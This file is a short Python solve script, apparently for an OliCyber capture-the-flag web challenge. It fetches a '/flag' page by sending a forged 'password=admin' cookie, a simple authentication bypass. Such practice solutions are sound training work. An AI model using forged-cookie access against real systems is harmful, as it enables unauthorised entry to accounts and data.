#!/bin/env python3 
import requests 

url = " http://web-05.challs.olicyber.it/flag"
cookies = {'password': 'admin'}

res = requests.get(url, cookies=cookies)
print(res.text)

